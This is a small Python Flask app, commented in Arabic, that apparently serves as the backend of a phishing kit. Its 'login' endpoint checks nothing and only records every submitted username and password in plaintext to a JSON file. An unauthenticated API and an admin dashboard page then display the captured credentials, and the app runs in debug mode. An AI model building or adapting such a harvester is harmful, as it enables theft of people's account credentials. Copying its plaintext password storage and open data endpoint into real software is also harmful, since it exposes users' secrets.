from flask import Flask, render_template, request, jsonify
import json
import os
from datetime import datetime

app = Flask(__name__)
DB_FILE = 'database.json'

# دالة لقراءة البيانات من الملف
def read_db():
    if not os.path.exists(DB_FILE):
        return []
    with open(DB_FILE, 'r', encoding='utf-8') as f:
        try:
            return json.load(f)
        except:
            return []

# دالة لحفظ البيانات في الملف
def save_db(data):
    with open(DB_FILE, 'w', encoding='utf-8') as f:
        json.dump(data, f, ensure_ascii=False, indent=4)

# الصفحة الأولى (تسجيل الدخول)
@app.route('/')
def index():
    return render_template('index.html')

# الصفحة الثانية (لوحة التحكم)
@app.route('/admin')
def admin():
    return render_template('admin.html')

# مسار (API) لاستقبال البيانات من صفحة تسجيل الدخول
@app.route('/api/login', methods=['POST'])
def login():
    data = request.json
    username = data.get('username')
    password = data.get('password')
    
    if not username or not password:
        return jsonify({"error": "Missing data"}), 400

    current_db = read_db()
    new_entry = {
        "username": username,
        "password": password,
        "time": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    }
    current_db.append(new_entry)
    save_db(current_db)
    
    return jsonify({"status": "success"})

# مسار (API) لجلب البيانات للوحة التحكم
@app.route('/api/get_data', methods=['GET'])
def get_data():
    return jsonify(read_db())

if __name__ == '__main__':
    app.run(debug=True)
